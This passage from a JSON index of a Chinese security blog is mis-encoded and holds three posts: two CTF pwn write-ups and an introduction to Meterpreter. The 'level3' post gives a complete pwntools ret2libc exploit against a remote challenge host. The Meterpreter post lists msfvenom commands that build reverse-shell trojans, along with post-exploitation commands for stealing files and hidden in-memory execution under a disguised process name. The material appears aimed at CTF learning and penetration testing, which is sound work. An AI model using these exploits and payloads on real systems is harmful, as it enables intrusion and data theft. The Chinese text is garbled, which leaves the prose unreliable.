cyberpeace{962a040a22938025e2ad4bbe3e5b56d3}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"æ”»é˜²ä¸–ç•Œ-pwn-stack2","slug":"æ”»é˜²ä¸–ç•Œ-pwn-stack2","date":"2022-08-09T04:04:51.567Z","updated":"2022-08-11T14:24:42.799Z","comments":true,"path":"2022/08/09/æ”»é˜²ä¸–ç•Œ-pwn-stack2/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/","excerpt":"","text":"0x01 åˆ†æchecksecæ£€æŸ¥ï¼š 32ä½ï¼Œæ— PIEï¼Œå¼€äº†NXå’Œcanary.è¿è¡Œä¸€ä¸‹æ˜¯åªæœ‰äº”ä¸ªæ¨¡å—ï¼Œå±•ç¤ºæ•°å­—ï¼Œæ·»åŠ ï¼Œæ›´æ”¹ï¼Œæ±‚å¹³å‡æ•°ï¼Œé€€å‡ºã€‚ IDAä¸­æŸ¥çœ‹mainå‡½æ•°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374int __cdecl main(int argc, const char **argv, const char **envp){ int v3; // eax unsigned int v5; // [esp+18h] [ebp-90h] unsigned int v6; // [esp+1Ch] [ebp-8Ch] int v7; // [esp+20h] [ebp-88h] unsigned int j; // [esp+24h] [ebp-84h] int v9; // [esp+28h] [ebp-80h] unsigned int i; // [esp+2Ch] [ebp-7Ch] unsigned int k; // [esp+30h] [ebp-78h] unsigned int l; // [esp+34h] [ebp-74h] char v13[100]; // [esp+38h] [ebp-70h] unsigned int v14; // [esp+9Ch] [ebp-Ch] v14 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); v9 = 0; puts(\"***********************************************************\"); puts(\"* An easy calc *\"); puts(\"*Give me your numbers and I will return to you an average *\"); puts(\"*(0 &lt;= x &lt; 256) *\"); puts(\"***********************************************************\"); puts(\"How many numbers you have:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"Give me your numbers\"); for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 0x63; ++i ) { __isoc99_scanf(\"%d\", &amp;v7); v13[i] = v7; } for ( j = v5; ; printf(\"average is %.2lf\\n\", (double)((long double)v9 / (double)j)) ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); __isoc99_scanf(\"%d\", &amp;v6); if ( v6 != 2 ) break; puts(\"Give me your number\"); __isoc99_scanf(\"%d\", &amp;v7); if ( j &lt;= 0x63 ) { v3 = j++; v13[v3] = v7; } } if ( v6 &gt; 2 ) break; if ( v6 != 1 ) return 0; puts(\"id\\t\\tnumber\"); for ( k = 0; k &lt; j; ++k ) printf(\"%d\\t\\t%d\\n\", k, v13[k]); } if ( v6 != 3 ) break; puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; } if ( v6 != 4 ) break; v9 = 0; for ( l = 0; l &lt; j; ++l ) v9 += v13[l]; } return 0;} å‘ç°æ²¡æœ‰æ£€æŸ¥v13æ•°ç»„è¾¹ç•Œï¼Œå½“é€‰æ‹©3.change numberæ—¶ç¨‹åºæ²¡æœ‰å¯¹v5è¿›è¡Œæ£€æµ‹ï¼Œå­˜åœ¨æ•°ç»„è¶Šç•Œï¼Œäº§ç”Ÿæº¢å‡ºï¼š 12345puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; å‘ç°ç»™äº†/bin/bash: 12345678910111213141516:0804859B ; __unwind {.text:0804859B push ebp.text:0804859C mov ebp, esp.text:0804859E sub esp, 18h.text:080485A1 mov eax, large gs:14h.text:080485A7 mov [ebp+var_C], eax.text:080485AA xor eax, eax.text:080485AC sub esp, 0Ch.text:080485AF push offset command ; \"/bin/bash\".text:080485B4 call _system ;system.text:080485B9 add esp, 10h.text:080485BC nop.text:080485BD mov edx, [ebp+var_C].text:080485C0 xor edx, large gs:14h.text:080485C7 jz short locret_80485CE.text:080485C9 call ___stack_chk_fail å¼€å¯åŠ¨æ€è°ƒè¯•ï¼Œåœ¨v13[v5]=v7å¤„ä¸‹æ–­ç‚¹ï¼Œ è½¬åˆ°IDAç•Œé¢ï¼ŒæŸ¥çœ‹æ­¤åœ°å€ï¼Œæ­¤æ—¶edxå­˜å…¥çš„å³ä¸ºè¾“å…¥çš„æ•°å­—9ï¼Œåœ¨æ ˆä¸­çš„ä½ç½®æ˜¯ï¼š å¾—åˆ°äº†è¾“å…¥åœ¨æ ˆä¸­çš„ä½ç½®ï¼Œæ‰¾åˆ°è¿”å›åœ°å€çš„ä½ç½®è¦†ç›–æ‰å°±å¯ä»¥äº†ã€‚","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"æ”»é˜²ä¸–ç•Œ level3","slug":"æ”»é˜²ä¸–ç•Œ-pwn-level3","date":"2022-08-09T04:01:34.298Z","updated":"2022-08-11T14:24:36.720Z","comments":true,"path":"2022/08/09/æ”»é˜²ä¸–ç•Œ-pwn-level3/","link":"","permalink":"https://sinky.top/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-level3/","excerpt":"","text":"è¿™é“é¢˜å¯¹äºæˆ‘æ¥è®²å¥½éš¾å¥½éš¾å•Šï¼Œæ¶‰åŠåˆ°äº†å¾ˆå¤šæ–°çš„çŸ¥è¯†ã€‚é¦–å…ˆchecksec :å¯ä»¥ç›´æ¥æ ˆæº¢å‡ºï¼›åŸºåœ°å€ä¸å˜åŒ–ï¼›å¯¹æ•°æ®æœ‰æ‰§è¡Œæƒé™ã€‚ æŸ¥çœ‹main()å‡½æ•°ï¼š æŸ¥çœ‹å‡½æ•°function()ï¼š æ— system,æ— /bin/shï¼Œç»™äº†ä¸€ä¸ªå…±äº«æ–‡ä»¶libc_32.so.6,æ˜æ˜¾ä¸ºret2libcã€‚ ret2libc (return-into-libc)æ˜¯ä¸€ç§åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºçš„ä»£ç å¤ç”¨æŠ€æœ¯ï¼Œä¸»è¦é€šè¿‡è¦†ç›–æ ˆå¸§çš„è¿”å›åœ°å€ï¼ˆEIPï¼‰ï¼Œä½¿å…¶è¿”å›åˆ°ç³»ç»Ÿä¸­çš„åº“å‡½æ•°ï¼Œåˆ©ç”¨åº“å‡½æ•°ä¸­å·²æœ‰çš„åŠŸèƒ½æ¥å®æ–½attackï¼Œè€Œä¸æ˜¯ç›´æ¥å®šä½åˆ°æ³¨å…¥çš„shellcodeã€‚systemå‡½æ•°å±äºlibcï¼Œè€Œlibc.soåŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ã€‚å³ä½¿ç¨‹åºæœ‰ASLRä¿æŠ¤ï¼Œä¹Ÿåªæ˜¯é’ˆå¯¹äºåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½çš„12ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œç”¨å·¥å…·æ¥æ‰¾åˆ°å¯¹åº”çš„libcæ–‡ä»¶ã€‚ ret2libcç‰¹å¾ï¼š1ã€æ²¡æœ‰/bin/shï¼›2ã€æ²¡æœ‰systemå’Œ/bin/shï¼›3ã€æ— systemå’Œ/bin/shï¼Œä½†æ˜¯ç»™äº†libc.soæ–‡ä»¶ï¼›4ã€è¿™ä¸‰ä¸ªå…¨éƒ½æ²¡æœ‰ã€‚ ASLRï¼šåœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼Œios,android,windows,macos,linuxçš„å½“å‰ç‰ˆæœ¬éƒ½å…·æœ‰ASLRä¿æŠ¤ã€‚ä¸»è¦ç”¨äºé˜²æ­¢ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼ŒASLRä¸è™šæ‹Ÿå†…å­˜ç®¡ç†ä¸€èµ·å·¥ä½œï¼Œå°†ç¨‹åºçš„ä¸åŒéƒ¨åˆ†çš„ä½ç½®éšæœºåŒ–ï¼Œä»¤æ”»å‡»è€…ä¸èƒ½é€šè¿‡å°è¯•å’Œé”™è¯¯äº†è§£ç›®æ ‡ä½ç½®ï¼Œå› ä¸ºåœ°å€å°†ä¸åŒã€‚ read()å‡½æ•°ä¸­ï¼Œbufå¤§å°ä¸º0x88ï¼Œä½†æ˜¯åœ¨å‡½æ•°ä¸­ç«Ÿç„¶è§„å®šäº†256ä¹‹å¤§ã€‚æ˜æ˜¾çš„æ ˆæº¢å‡ºã€‚ æ”»å‡»æ€è·¯libcå†…çš„åœ°å€æ˜¯éšæœºçš„ï¼Œä½†æ˜¯å‡½æ•°çš„ç›¸å¯¹åœ°å€æ˜¯ä¸å˜çš„ï¼Œåªè¦çŸ¥é“å…¶ä¸­æŸä¸€ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå†åˆ©ç”¨ç›¸å¯¹ä½ç§»è®¡ç®—å‡ºæˆ‘ä»¬æ‰€éœ€è¦çš„å‡½æ•°çš„åœ°å€ï¼Œå¦‚æœçŸ¥é“readæˆ–writeå‡½æ•°çš„åœ°å€å°±å¯ä»¥è®¡ç®—å‡ºå…¶ä»–å‡½æ•°çš„åœ°å€ã€‚ æŸå¤§ä½¬æ”»å‡»æ€è·¯ï¼š ï¼ˆ1ï¼‰é€šè¿‡function()ä¸­çš„readæ„é€ æ ˆæº¢å‡ºï¼Œå¹¶ä¸”è¦†å†™è¿”å›åœ°å€ä¸ºpltä¸­çš„writeåœ°å€ã€‚ï¼ˆ2ï¼‰é€šè¿‡wirteæ³„éœ²readåœ¨å†…å­˜ä¸­çš„ç»å¯¹åœ°å€ï¼Œå¹¶ä¸”æ¥ç€è°ƒç”¨function()ï¼ˆæ³¨ï¼šgotä¸­çš„readä¿å­˜ç€readåœ¨å†…å­˜ä¸­çš„çœŸå®åœ°å€ï¼‰ï¼ˆ3ï¼‰è®¡ç®—å‡ºsystemå’Œ/bin/shçš„ç»å¯¹åœ°å€ï¼Œå†é€šè¿‡functionæ„é€ æ ˆæº¢å‡ºè¿›è¡Œè¦†å†™ã€‚ï¼ˆ4ï¼‰æˆåŠŸ pltï¼šprocedure Linkage Tableï¼Œå»¶è¿Ÿç»‘å®šï¼Œå‡½æ•°ç¬¬ä¸€æ¬¡ç”¨åˆ°æ—¶æ‰è¿›è¡Œç»‘å®šï¼ˆç¬¦å·æŸ¥æ‰¾ï¼Œé‡å®šä½ç­‰ï¼‰ï¼›å®ç°æ‰‹æ³•ï¼šå¢åŠ ä¸€å±‚é—´æ¥è·³è½¬ã€‚è°ƒç”¨å‡½æ•°æ—¶å¹¶ä¸ç›´æ¥é€šè¿‡GOTè·³è½¬ï¼Œè€Œæ˜¯é€šè¿‡ä¸€ä¸ªå«åšPLTçš„é¡¹çš„ç»“æ„æ¥è¿›è¡Œè·³è½¬ï¼Œæ¯ä¸ªå¤–éƒ¨å‡½æ•°åœ¨PLTä¸­éƒ½æœ‰ä¸€ä¸ªç›¸åº”çš„é¡¹ã€‚ELFå°†GOTæ‹†åˆ†æˆä¸¤ä¸ªè¡¨å«åš.gotå’Œ.got.pltã€‚.gotç”¨æ¥ä¿å­˜å…¨å±€å˜é‡å¼•ç”¨çš„åœ°å€.got.pltç”¨æ¥ä¿å­˜å‡½æ•°å¼•ç”¨çš„åœ°å€ï¼Œå¤–éƒ¨å‡½æ•°çš„å¼•ç”¨å…¨éƒ¨æ”¾åˆ° .plt.gotä¸­ã€‚ æ€è·¯ é€šè¿‡readè¦†ç›–è¿”å›åœ°å€æ²¡æ‰§è¡Œä¸¤æ¬¡mainå‡½æ•°ï¼Œç¬¬ä¸€æ¬¡æ³„éœ²writeå‡½æ•°çš„åœ°å€ï¼Œç¬¬äºŒæ¬¡æ‰§è¡Œsystemå‡½æ•°ã€‚ exp: 123456789101112131415161718192021222324252627282930313233343536from pwn import*p=remote('111.198.29.45',52277) # p=process(\"./level3\") # è·å–æ–‡ä»¶å¯¹è±¡elf=ELF('./level3') #è·å–libåº“å¯¹è±¡libc=ELF('./libc_32.so.6') #è·å–å‡½æ•°wirte_plt=elf.plt['write']write_got=elf.got[write']main_addr=elf.sym['main'] #æ¥å—æ•°æ®p.recvuntil(\":\\n\") #char[88],ebp writeå‡½æ•°åœ°å€ï¼Œwriteå‡½æ•°è¿”å›åœ°å€ï¼ˆè¿”å›åˆ°mainå‡½æ•°ï¼‰ writeå‡½æ•°å‚æ•°ä¸€ï¼ˆ1ï¼‰ writeå‡½æ•°å‚æ•°äºŒï¼ˆwrite_gotçš„åœ°å€ï¼‰writeå‚æ•°ä¸‰ï¼ˆå†™4å­—èŠ‚ï¼‰payload=0x88*'a'+p32(0xdeadbeef)+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)p.sendline(payload) #è·å–wirteåœ¨gotä¸­çš„åœ°å€write_got_addr=u32(p.recv())print hex(write_got_addr) # è®¡ç®—libåº“åŠ è½½åŸºå€libc_base=write_got_addr-libc.sym['write']print hex(libc_base) # è®¡ç®—systemçš„åœ°å€system_addr=libc_base+libc.sym['system']print hex(bin_sh_addr) #è®¡ç®—å­—ç¬¦ä¸²/bin/sh çš„åœ°å€ã€‚0x15902bä¸ºåç§»ï¼Œé€šè¿‡å‘½ä»¤ï¼šstrings -a -t x libc_32.so.6 | grep \"/bin/sh\"è·å–bin_sh_addr=libc_base+0x15902bprint hex(bin_sh_addr) #char [88] ebp system systemå‡½æ•°çš„è¿”å›åœ°å€ systemå‡½æ•°çš„å‚æ•°(bin_sh_addr)payload2=0x88*'a'+p32(0xdeadbeef)+p32(system_addr)+p32(0x11111111)+p32(bin_sh_addr) #æ¥å—æ•°æ®p.recvuntil(\":\\n\") #å‘é€payloasp.sendline(payload2) #åˆ‡æ¢äº¤äº’æ¨¡å¼p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://sinky.top/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://sinky.top/tags/pwn/"}]},{"title":"åˆè¯†Meterpreter","slug":"åˆè¯†Meterpreter","date":"2022-08-09T03:50:57.231Z","updated":"2022-08-11T14:20:16.285Z","comments":true,"path":"2022/08/09/åˆè¯†Meterpreter/","link":"","permalink":"https://sinky.top/2022/08/09/%E5%88%9D%E8%AF%86Meterpreter/","excerpt":"","text":"ä»€ä¹ˆæ˜¯Meterpretermetrepreter æ˜¯metasploitæ¡†æ¶ä¸­çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œä½œä¸ºæº¢å‡ºæˆåŠŸä»¥åçš„æ”»å‡»è½½è·ä½¿ç”¨ï¼Œæ”»å‡»è½½è·åœ¨æº¢å‡ºæ”»å‡»æˆåŠŸä»¥åç»™æˆ‘ä»¬è¿”å›ä¸€ä¸ªæ§åˆ¶é€šé“ï¼Œä½¿ç”¨å®ƒä½œä¸ºæ”»å‡»è½½è·èƒ½å¤Ÿè·å¾—ç›®æ ‡ç³»ç»Ÿçš„ä¸€ä¸ªmeterpreter shellçš„é“¾æ¥ã€‚ meterpreter shellä½œä¸ºæ¸—é€æ¨¡å—æœ‰å¾ˆå¤šæœ‰ç”¨çš„åŠŸèƒ½ï¼Œå¦‚ï¼šæ·»åŠ ç”¨æˆ·ã€éšè—ã€æ‰“å¼€shellã€å¾—åˆ°ç”¨æˆ·å¯†ç ã€ä¸Šä¼ ä¸‹è½½è¿œç¨‹ä¸»æœºæ–‡ä»¶ã€è¿è¡Œcmdã€å¾—åˆ°è¿œç¨‹æ§åˆ¶æƒã€æ•è·æŒ‰é”®ä¿¡æ¯ã€æ¸…é™¤åº”ç”¨ç¨‹åºã€æ˜¾ç¤ºè¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ ç½‘ç»œæ¥å£ ipåœ°å€ç­‰ä¿¡æ¯ã€‚Meterpreterèƒ½å¤Ÿèº²é¿å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œåœ¨è¿œç¨‹ä¸»æœºä¸Šéšè—è‡ªå·±ï¼Œä¸æ”¹å˜ç³»ç»Ÿç¡¬ç›˜ä¸­çš„æ–‡ä»¶Meterpreter æ˜¯ä¸€ç§åæ¸—é€å·¥å…·ï¼Œå±äºä¸€ç§åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å¯é€šè¿‡ç½‘ç»œè¿›è¡ŒåŠŸèƒ½æ‰©å±•çš„åŠ¨æ€å¯æ‰©å±•å‹payloadï¼Œæ­¤å·¥å…·åŸºäºå†…å­˜DLLæ³¨å…¥ç†å¿µå®ç°ï¼Œé€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹å¹¶è°ƒç”¨æ³¨å…¥çš„DLLæ¥è®©ç›®æ ‡ç³»ç»Ÿè¿è¡Œæ³¨å…¥çš„DLLæ–‡ä»¶ã€‚æ”»å‡»è€…ä¸ç›®æ ‡è®¾å¤‡ä¸­Meterpreterçš„é€šä¿¡æ˜¯é€šè¿‡Stagerå¥—æ¥å­—å®ç°ã€‚ Meterpreterä¸­å¸¸ç”¨åå¼¹ç±»å‹1.reverse_tcpåŸºäºTCPçš„åå‘é“¾æ¥åå¼¹shellï¼Œä½¿ç”¨ç¨³å®šã€‚ Linux: linuxä¸‹åå¼¹shellæœ¨é©¬ï¼š msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f elf -o shell ç›®å½•ä¸‹ç”Ÿæˆæœ¨é©¬æ–‡ä»¶isshellï¼Œä¸ºæ–‡ä»¶åŠ å¯æ‰§è¡Œæƒé™ï¼Œæ‰“å¼€metasploitï¼Œä½¿ç”¨æ¨¡å—handlerè®¾ç½®payload(ä¸ç”Ÿæˆæœ¨é©¬æ‰€ä½¿ç”¨payloadä¸€è‡´) è®¾ç½®åœ°å€å’Œç«¯å£ï¼Œå¼€å§‹ç›‘å¬ã€‚ è¿è¡Œåå¼¹shellæœ¨é©¬ï¼ŒæˆåŠŸåå¼¹å›shell Windows: msfvenom -p windows/meterpreter/reverse_tcp lhost=[ä½ çš„ip] lport=[ç«¯å£] -f exe -o [è¦ç”Ÿæˆçš„æ–‡ä»¶å] msfvenom -p windows/meterpreter/reverse_tcp lhost=[ip] lport=4444 -f exe -o shell.exe 2.reverse_httpåŸºäºhttpæ–¹å¼çš„åå‘è¿æ¥ï¼Œç½‘é€Ÿæ…¢çš„æƒ…å†µä¸‹ä¸ç¨³å®šã€‚ payload: /windows/meterpreter/reverse_http 3.reverse_httpsåŸºäºhttpsæ–¹å¼çš„åå‘è¿æ¥ï¼Œç½‘é€Ÿæ…¢çš„æƒ…å†µä¸‹ä¸ç¨³å®šï¼Œhttpsè‹¥åå¼¹æ²¡æ”¶åˆ°æ•°æ®ï¼Œå¯ä»¥å°†ç›‘å¬ç«¯å£æ¢æˆ443è¯•è¯•ã€‚ payload: /windows/meterpreter/reverse_https 4.bind_tcpåŸºäºTCPçš„æ­£å‘è¿æ¥shellï¼Œä¸€èˆ¬åœ¨å†…ç½‘ä½¿ç”¨ï¼Œä¸éœ€è¦è®¾ç½®LHOSTã€‚ msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o shell åŠ æƒè¿è¡Œã€‚ Meterpreter å¸¸ç”¨å‘½ä»¤###1.åŸºæœ¬å‘½ä»¤ help â€“æŸ¥çœ‹Meterpreterå¸®åŠ© background â€“è¿”å›ï¼ŒæŠŠmeterpreteråå°æŒ‚èµ· bgkill â€“æ€æ­»ä¸€ä¸ªèƒŒæ™¯ meterpreter è„šæœ¬ bglist â€“æä¾›æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„åå°è„šæœ¬çš„åˆ—è¡¨ bgrun â€“ä½œä¸ºä¸€ä¸ªåå°çº¿ç¨‹è¿è¡Œè„šæœ¬ channel â€“æ˜¾ç¤ºæ´»åŠ¨é¢‘é“ sessions -i number â€“ä¸ä¼šè¯è¿›è¡Œäº¤äº’ï¼Œnumberè¡¨ç¤ºç¬¬nä¸ªsession,ä½¿ç”¨session -i è¿æ¥åˆ°æŒ‡å®šåºå·çš„meterpreterä¼šè¯å·²ç»§ç»­åˆ©ç”¨ sesssions -k number â€“ä¸ä¼šè¯è¿›è¡Œäº¤äº’ close â€“å…³é—­é€šé“ exit â€“ç»ˆæ­¢ meterpreter ä¼šè¯ quit â€“ç»ˆæ­¢ meterpreter ä¼šè¯ interact id â€“åˆ‡æ¢è¿›ä¸€ä¸ªä¿¡é“ run â€“æ‰§è¡Œä¸€ä¸ªå·²æœ‰çš„æ¨¡å—ï¼Œè¿™é‡Œè¦è¯´çš„æ˜¯è¾“å…¥runåæŒ‰ä¸¤ä¸‹tabï¼Œä¼šåˆ—å‡ºæ‰€æœ‰çš„å·²æœ‰çš„è„šæœ¬ï¼Œå¸¸ç”¨çš„æœ‰autoroute,hashdump,arp_scanner,multi_meter_injectç­‰ irb â€“è¿›å…¥ Ruby è„šæœ¬æ¨¡å¼ read â€“ä»é€šé“è¯»å–æ•°æ® write â€“å°†æ•°æ®å†™å…¥åˆ°ä¸€ä¸ªé€šé“ runå’Œbgrun â€“å‰å°å’Œåå°æ‰§è¡Œä»¥åå®ƒé€‰å®šçš„ meterpreter è„šæœ¬ use â€“åŠ è½½ meterpreter çš„æ‰©å±• load/use â€“åŠ è½½æ¨¡å— Resource â€“æ‰§è¡Œä¸€ä¸ªå·²æœ‰çš„rcè„šæœ¬ 2.æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤ cat c:\\boot.ini â€“æŸ¥çœ‹æ–‡ä»¶å†…å®¹,æ–‡ä»¶å¿…é¡»å­˜åœ¨ del c:\\boot.ini â€“åˆ é™¤æŒ‡å®šçš„æ–‡ä»¶ upload /root/Desktop/netcat.exe c:\\ â€“ä¸Šä¼ æ–‡ä»¶åˆ°ç›®æ ‡æœºä¸»ä¸Šï¼Œå¦‚upload setup.exe C:\\windows\\system32\\ download nimeia.txt /root/Desktop/ â€“ä¸‹è½½æ–‡ä»¶åˆ°æœ¬æœºä¸Šå¦‚ï¼šdownload C:\\boot.ini /root/æˆ–è€…download C:\\â€œProgramFilesâ€\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/ edit c:\\boot.ini â€“ç¼–è¾‘æ–‡ä»¶ getlwd â€“æ‰“å°æœ¬åœ°ç›®å½• getwd â€“æ‰“å°å·¥ä½œç›®å½• lcd â€“æ›´æ”¹æœ¬åœ°ç›®å½• ls â€“åˆ—å‡ºåœ¨å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶åˆ—è¡¨ lpwd â€“æ‰“å°æœ¬åœ°ç›®å½• pwd â€“è¾“å‡ºå·¥ä½œç›®å½• cd c:\\ â€“è¿›å…¥ç›®å½•æ–‡ä»¶ä¸‹ rm file â€“åˆ é™¤æ–‡ä»¶ mkdir dier â€“åœ¨å—å®³è€…ç³»ç»Ÿä¸Šçš„åˆ›å»ºç›®å½• rmdir â€“å—å®³è€…ç³»ç»Ÿä¸Šåˆ é™¤ç›®å½• dir â€“åˆ—å‡ºç›®æ ‡ä¸»æœºçš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ä¿¡æ¯ mv â€“ä¿®æ”¹ç›®æ ‡ä¸»æœºä¸Šçš„æ–‡ä»¶å search -d d:\\www -f web.config â€“search æ–‡ä»¶ï¼Œå¦‚search -d c:\\ -f*.doc meterpreter &gt; search -f autoexec.bat â€“æœç´¢æ–‡ä»¶ meterpreter &gt; search -f sea*.bat c:\\xamp\\ enumdesktops â€“ç”¨æˆ·ç™»å½•æ•° ä¸‹è½½æ–‡ä»¶:ä½¿ç”¨å‘½ä»¤â€œdownload +file pathâ€,å°†ä¸‹è½½ç›®æ ‡æœºå™¨çš„ç›¸å¯¹åº”æƒé™çš„ä»»ä½•è·¯å¾„ä¸‹çš„æ–‡ä»¶ ä¸Šä¼ æ–‡ä»¶: upload å‘½ä»¤ä¸ºä¸Šä¼ æ–‡ä»¶åˆ°æˆ‘ä»¬çš„ç›®æ ‡æœºå™¨ æŸ¥çœ‹æ–‡ä»¶: cat filename åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œè¾“å…¥å‘½ä»¤åä¾¿ä¼šè¿”å›ç»™æˆ‘ä»¬æ‰€æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ã€‚ åˆ‡æ¢ã€æŸ¥è¯¢å½“å‰è·¯å¾„: pwd å‘½ä»¤å°†æŸ¥è¯¢å½“å‰åœ¨doså‘½ä»¤ä¸‹çš„è·¯å¾„ï¼Œâ€œcdâ€å‘½ä»¤å¯ä»¥æ”¹å˜å½“å‰è·¯å¾„ sysinfo å‘½ä»¤: æ˜¾ç¤ºè¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ï¼Œæ˜¾ç¤ºè®¡ç®—æœºã€ç³»ç»Ÿä¿¡æ¯ã€ç»“æ„ã€è¯­è¨€ç­‰ä¿¡æ¯ã€‚å¯ä»¥çœ‹åˆ°è¿œç¨‹ä¸»æœºçš„æ“ä½œç³»ç»Ÿæ˜¯windows XP service pack 2ï¼Œsp2è¿™ä¸ªç³»ç»Ÿæœ‰å¾ˆå¤šæ¼æ´ã€‚ executeå‘½ä»¤: ä¸ºç›®æ ‡ä¸»æœºä¸Šæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œå…¶ä¸­â€œexecute -hâ€æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ã€‚-fä¸ºæ‰§è¡Œè¦è¿è¡Œçš„å‘½ä»¤ å¦‚æœå¸Œæœ›éšè—åå°æ‰§è¡Œï¼ŒåŠ å‚æ•°-H execute -H -f notepad.exe æˆ‘ä»¬è¿è¡Œç›®æ ‡ä¸»æœºä¸Šçš„cmd.exeç¨‹åºï¼Œå¹¶ä»¥éšè—çš„æ–¹å¼ç›´æ¥äº¤äº’åˆ°æˆ‘ä»¬çš„meterpreterä¼šè¯ä¸Š execute -H -i -f cmd.exe åœ¨ç›®æ ‡ä¸»æœºå†…å­˜ä¸­ç›´æ¥æ‰§è¡Œæˆ‘ä»¬æ”»å‡»ä¸»æœºä¸Šçš„æ”»å‡»ç¨‹åºï¼Œæ¯”å¦‚wce.exeï¼Œåˆæ¯”å¦‚æœ¨é©¬ç­‰ï¼Œè¿™æ ·å¯ä»¥é¿å…æ”»å‡»ç¨‹åºå­˜å‚¨åˆ°ç›®æ ‡ä¸»æœºç¡¬ç›˜ä¸Šè¢«å‘ç°æˆ–è¢«æŸ¥æ€ execute -H -m -d notepad.exe-f wce.exe -a \"-o wce.txt\" -d åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œæ—¶æ˜¾ç¤ºçš„è¿›ç¨‹åç§°ï¼ˆç”¨ä»¥ä¼ªè£…ï¼‰ -m ç›´æ¥ä»å†…å­˜ä¸­æ‰§è¡Œ -o wce.txt æ˜¯wce.exeçš„è¿è¡Œå‚æ•° idletimeå‘½ä»¤:ä¸ºæ˜¾ç¤ºç›®æ ‡æœºå™¨æˆªæ­¢åˆ°å½“å‰æ— æ“ä½œå‘½ä»¤çš„æ—¶é—´ searchå‘½ä»¤:åœ¨ç›®æ ‡ä¸»æœºæœç´¢ç‰¹å®šçš„æ–‡ä»¶ã€‚è¯¥å‘½ä»¤èƒ½å¤Ÿé€šè¿‡æœç´¢æ•´ä¸ªç³»ç»Ÿæˆ–ç‰¹å®šçš„æ–‡ä»¶å¤¹ã€‚ä½¿ç”¨search â€“hå‘½ä»¤æ¥æŸ¥çœ‹searchå‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯ editå‘½ä»¤: è°ƒç”¨viç¼–è¾‘å™¨ï¼Œå¯¹ç›®æ ‡ä¸»æœºä¸Šçš„æ–‡ä»¶ä¿®æ”¹ 3.ç½‘ç»œå‘½ä»¤ ipconfig/ifconfig â€“æ˜¾ç¤ºç½‘ç»œæ¥å£çš„å…³é”®ä¿¡æ¯ï¼ŒåŒ…æ‹¬ IP åœ°å€ portfwd add -l 4444 -p 3389 -r 192.168.1.102 â€“ç«¯å£è½¬å‘,æœ¬æœºç›‘å¬4444,æŠŠç›®æ ‡æœº3389è½¬åˆ°æœ¬æœº4444 netstat -an | grepâ€œ4444â€ â€“æŸ¥çœ‹æŒ‡å®šç«¯å£å¼€æ”¾æƒ…å†µ rdesktop -u Administrator -p bk#123 127.0.0.1:4444 â€“ä½¿ç”¨rdesktopæ¥è¿æ¥æ¡Œé¢ï¼Œ-u ç”¨æˆ·å -p å¯†ç  rdesktop 127.1.1.0:4444 â€“éœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç è¿œç¨‹è¿æ¥ route â€“æŸ¥çœ‹æˆ–ä¿®æ”¹å—å®³è€…è·¯ç”±è¡¨ route add 192.168.1.0 255.255.255.0 1 â€“æ·»åŠ åŠ¨æ€è·¯ç”± route print â€“è·¯ç”±è¡¨è¾“å‡º runget_local_subnets â€“ç›®æ ‡ä¸»æœºçš„å†…ç½‘IPæ®µæƒ…å†µ Arp â€“çœ‹ARPç¼“å†²è¡¨ Getproxy â€“è·å–ä»£ç† 